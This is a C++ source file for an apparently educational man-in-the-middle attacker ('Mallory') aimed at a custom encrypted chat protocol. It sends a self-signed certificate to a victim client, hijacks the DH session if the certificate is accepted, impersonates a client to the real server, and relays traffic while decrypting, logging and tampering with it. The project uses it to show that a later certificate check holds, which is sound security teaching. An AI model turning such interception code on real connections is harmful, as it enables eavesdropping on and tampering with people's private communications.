#include "protocol.h"
#include "dh.h"
#include "crypto_utils.h"
#include "aes_gcm.h"
#include "base64.h"
#include "pki.h"
#include "handshake.h"
#include "net_io.h"
#include "openssl_raii.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>
#include <thread>
#include <string>
#include <array>
#include <atomic>

void relay_loop(
    int sock_in, int sock_out,
    const std::array<unsigned char, AES_KEY_SIZE>& key_in,
    const std::array<unsigned char, AES_KEY_SIZE>& key_out,
    const std::string& label,
    std::atomic<bool>& running
) {
    std::string pending;
    while (running) {
        std::string raw_line;
        if (!read_line(sock_in, pending, raw_line)) {
            std::cout << "\n[" << label << "] Disconnected.\n";
            running = false;
            break;
        }
        try {
            std::string plaintext = decrypt_message(key_in, base64_decode(raw_line));
            std::cout << "[MITM INTERCEPT - " << label << "] " << plaintext << "\n";

            std::string new_blob = encrypt_message(key_out, plaintext);
            if (plaintext.find("TRIGGER_TAMPER") != std::string::npos) {
                std::cout << "[MITM] Tampering with ciphertext bit...\n";
                new_blob[12] ^= 0x01;
            }
            send_line(sock_out, base64_encode(new_blob));
        } catch (const std::exception& e) {
            std::cerr << "[" << label << "] Relay error: " << e.what() << "\n";
            running = false;
            break;
        }
    }
}

// Attempts to pose as the SERVER to a victim client, presenting Mallory's
// own self-signed (non-CA-signed) certificate. A correctly implemented
// Phase 3 client MUST reject this before sending anything further
bool attempt_pose_as_server(
    int client_sock,
    X509* fake_cert,
    EVP_PKEY* fake_key,
    std::array<unsigned char, AES_KEY_SIZE>& session_key_out
) {
    std::string pending;

    std::string cert_pem = certificate_to_pem(fake_cert);
    if (!send_line(client_sock, "CERT " + base64_encode(cert_pem))) {
        std::cout << "[MITM] Victim disconnected before we could send our fake CERT.\n";
        return false;
    }
    std::cout << "[MITM] Sent self-signed (non-CA-signed) certificate to victim.\n";

    std::string line;
    if (!read_line(client_sock, pending, line)) {
        std::cout << "[MITM] Victim closed the connection without sending a CHALLENGE.\n"
                   << "[MITM] This is the EXPECTED, correct outcome: the client's "
                      "certificate signature check failed against its trusted CA \n";
        return false;
    }

    if (!starts_with(line, "CHALLENGE ")) {
        std::cout << "[MITM] Unexpected message instead of CHALLENGE: " << line << "\n";
        return false;
    }

    std::cout << "[MITM] WARNING: victim proceeded past certificate validation with "
                 "an uncertified cert — this would indicate a bug in the victim's "
                 "validation logic, not an expected outcome. Continuing to show impact.\n";

    std::string challenge = line.substr(10);
    std::string signature = sign_challenge(fake_key, challenge);
    if (!send_line(client_sock, "SIG " + base64_encode(signature))) return false;

    if (!read_line(client_sock, pending, line) || !starts_with(line, "DH_INIT ")) return false;
    std::string client_pub = line.substr(8);

    DiffieHellman dh;
    dh.generate_keypair();
    if (!send_line(client_sock, "DH_ACK " + dh.get_public_value_hex())) return false;

    std::string shared_secret = dh.compute_shared_secret(client_pub);
    session_key_out = derive_key(shared_secret);
    std::cout << "[MITM] Fully hijacked victim session.\n";
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0]
                  << " <real_server_ip> <real_server_port> <ca_cert_path> "
                     "<expected_server_cn> <mallory_fake_cert_dir>\n"
                  << "  <mallory_fake_cert_dir> must contain fake.crt/fake.key\n"
                  << "  (generate via mallory/generate_fake_cert.sh)\n";
        return 1;
    }

    std::string real_ip = argv[1];
    int real_port = std::stoi(argv[2]);
    std::string ca_cert_path = argv[3];
    std::string expected_cn = argv[4];
    std::string fake_dir = argv[5];

    X509_ptr fake_cert;
    EVP_PKEY_ptr fake_key;
    try {
        fake_cert = load_certificate(fake_dir + "/fake.crt");
        fake_key = load_private_key(fake_dir + "/fake.key");
    } catch (const std::exception& e) {
        std::cerr << "[MITM] Failed to load Mallory's fake identity: " << e.what() << "\n";
        return 1;
    }

    int proxy_port = 5001;
    int proxy_server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(proxy_server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in proxy_addr{};
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = INADDR_ANY;
    proxy_addr.sin_port = htons(proxy_port);
    bind(proxy_server_sock, (sockaddr*)&proxy_addr, sizeof(proxy_addr));
    listen(proxy_server_sock, 1);

    std::cout << "[MITM] Listening on port " << proxy_port
              << " — point a victim client here instead of the real server.\n";
    int client_sock = accept(proxy_server_sock, nullptr, nullptr);
    std::cout << "[MITM] Victim client connected.\n\n";

    std::cout << "--- Attempt 1: pose as SERVER to the victim client ---\n";
    std::array<unsigned char, AES_KEY_SIZE> key_client;
    bool posed_as_server_ok = attempt_pose_as_server(client_sock, fake_cert.get(), fake_key.get(), key_client);

    std::cout << "\n--- Attempt 2: pose as CLIENT to the real server ---\n";
    // Only added SERVER authentication — the server still doesn't
    // authenticate clients, so this half of a Phase-2-style MITM still
    // works exactly as before.
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(real_port);
    inet_pton(AF_INET, real_ip.c_str(), &server_addr.sin_addr);

    std::array<unsigned char, AES_KEY_SIZE> key_server;
    bool posed_as_client_ok = false;
    if (connect(server_sock, (sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
        std::string pending_to_server;
        posed_as_client_ok = client_perform_handshake(
            server_sock, pending_to_server, ca_cert_path, expected_cn, key_server);
    } else {
        std::cerr << "[MITM] Failed to connect to real server.\n";
    }

    std::cout << "\n========== ATTACK SUMMARY ==========\n"
              << "Pose as SERVER to victim : "
              << (posed_as_server_ok ? "SUCCEEDED (unexpected!)" : "FAILED (expected — Phase 3 defense holds)") << "\n"
              << "Pose as CLIENT to server : "
              << (posed_as_client_ok ? "SUCCEEDED (server has no client-auth requirement)" : "FAILED") << "\n"
              << "=====================================\n\n";

    if (posed_as_server_ok && posed_as_client_ok) {
        std::cout << "[MITM] Both halves succeeded — relaying (should not be reachable "
                     "against a correct Phase 3 client).\n";
        std::atomic<bool> running(true);
        std::thread t1(relay_loop, client_sock, server_sock, key_client, key_server, "C->S", std::ref(running));
        std::thread t2(relay_loop, server_sock, client_sock, key_server, key_client, "S->C", std::ref(running));
        t1.join();
        t2.join();
    } else {
        std::cout << "[MITM] Attack could not be fully completed — this contrast with "
                     "Phase 2 (where it succeeded).\n";
    }

    close(client_sock);
    close(server_sock);
    close(proxy_server_sock);
    return 0;
}